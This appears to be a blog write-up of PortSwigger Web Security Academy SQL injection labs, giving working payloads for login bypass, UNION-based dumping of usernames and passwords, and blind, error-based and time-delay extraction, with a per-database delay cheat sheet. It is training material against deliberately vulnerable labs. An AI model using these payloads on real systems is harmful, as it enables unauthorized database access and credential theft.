This post will run through the labs on web sec academy by Portswigger related to SQL injections.  
  
SQL injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. This can allow an attacker to view data that they are not normally able to retrieve. For example in this URL:
```
https://insecure-website.com/products?category=Gifts
```
We see there is SQL query being made and it would like this:
```
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```
By changing our query from Gifts to Gifts'-- we can manipulate the query to show all Gift products as -- is a comment inidicator in SQL so it disregards the released = 1. Also by adding +OR+1=1-- we can get the products from all categories.

### <u>Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
This lab perform a SQL injection attack that causes the application to display one or more unreleased products. So by add '+OR+1=1 we can cause it to show us all the products.

### <u>Lab: SQL injection vulnerability allowing login bypass
Some applications may login users by doing an SQl query with the entered username and password which if there is an SQLi vulnerability allows for login bypass. By entering this, administrator' -- , as our username we can bypass and login as admin.

## <u><b>Union attacks
Using the UNION keyword we can retrieve data from other tables. For it to work there are two requirements:
- The individual queries must return the same number of columns
- The data types in each column must be compatible between the individual queries
We can find the number of columns required injecting ' ORDER BY 1-- and repeating till we get to the number where an error occurs. Or we could inject ' UNION SELECT NULL-- and add more ,NULL until we don't get an error.  

### <u>Lab: SQL injection UNION attack, determining the number of columns returned by the query
For this lab we just use the methods shown above. I used the ' UNION SELECT NULL-- and iterated till I didn't get an error and that occured when I had 3 NULLs showing there is 3 columns. In other labs which may use Oracle might require every SELECT query to have FROM included which you can use FROM DUAL as dual is a built in table in Oracle. 

### <u>Lab: SQL injection UNION attack, finding a column containing text
Once find the number of columns we need to find which ones have useful data types. For example for the last lab we found out there are 3 columns using ' UNION SELECT NULL,NULL,NULL-- and by going through each column and putting a string we can find if any column returns strings. Like so:
```
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--
' UNION SELECT NULL,NULL,'a'--
```
For this lab there is also three columns and using this above method we find that the second column has a data type string.

### <u>Lab: SQL injection UNION attack, retrieving data from other tables

### <u>Lab: SQL injection UNION attack, retrieving multiple values in a single column
In some cases only a single column is returned so if we want to retrieve multiple values we will need to concatenate them which we can do through using || which concatenate strings in Oracle. So for this lab we will first check how many columns there are using ' UNION SELECT NULL-- and we find there are two columns. Now we want to find out if the columns have data type string and with this: ' UNION SELECT NULL,'a'-- , we find the 2nd column accepts strings. Now since we have only one column which returns strings we will concatenate the username and passwords into this column with this query:
```
' UNION SELECT NULL,username ||'~'|| password FROM users--
```
Which gets us all the usernames and passwords.

## <u><b>Blind SQL
Blind SQL injection occurs when an application is vulnerable to SQL injection, but its HTTP responses do not contain the results of the relevant SQL query or the details of any database errors. If we have a query that has an effect on the website but doesn't show the results then through injecting a condition we can extract data one piece at a time.

### <u>Lab: Blind SQL injection with conditional responses
In this lab there is a cookie called TrackingId which is vulnerable to a SQL injection but since we can't directly get information from the database we will have an injection with a condition attached to the original query as such:
```
' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1) = <letter>
```
In this query by going through all the letters we will eventually reach one where the result is true thus the qeury will return. When it does return we notice there is a change on the web page as it says "Welcome back". By going through all combinations we get the admin's password: xix9ft15rj1gnru65hyu
### <u>Lab: Blind SQL injection with conditional errors
Sometimes there will be no apparent change in the application when trying to do a Blind SQLi but by inducing errors we can figure out the response. For example you can trigger a divide by zero error if the condition you set is not true using the CASE keyword.  
For our lab we are told it is an Oracle database so the injection would look like:
```
'||(SELECT CASE WHEN SUBSTR(password,1,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```
Now through iterating through all letters and positions we can get the password: t6n50gc4vfu471mp349x

### <u>Lab: Visible error-based SQL injection
Sometimes the results from databases might have verbose error messages which can provide us information. For example in this lab by inserting a qoutation mark we can induce the following error:
```
Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = 'VsJltEian2Rgr93U''. Expected  char
```
This error shows us how the SQL query is set up in the backend. We can also use the CAST function to have the error message include data returned from a query as such:
```
a' AND CAST((SELECT password FROM users LIMIT 1)AS int)='1
```
Which returns:
```
ERROR: invalid input syntax for type integer: "jyn3ry78crkevn2z3ug4"
```

### <u>Lab: Blind SQL injection with time delays and information retrieval
In other cases when the database catches error if it handles the properly we will not be able to get responses like in the last lab. However we can still extract information by triggring time delays. Since the technique for delivering time delays is different for each database we will first have to figure out which one the lab is using. By going through each technique we figure out we can only delay using PostgreSQL:


| Database    | SQL Query |
|------------|-----------|
| **Oracle** | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'|| dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual` |
| **Microsoft** | `IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'` |
| **PostgreSQL** | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END` |
| **MySQL** | `SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')` |


Now we can make our query to brute force to find out the password:
```
TrackingId=a'%3b SELECT CASE WHEN (SUBSTRING(password,1,1)='') AND username='administrator' THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
```
And we get the password:  
5vtyfcc04drr2rgnrjs7
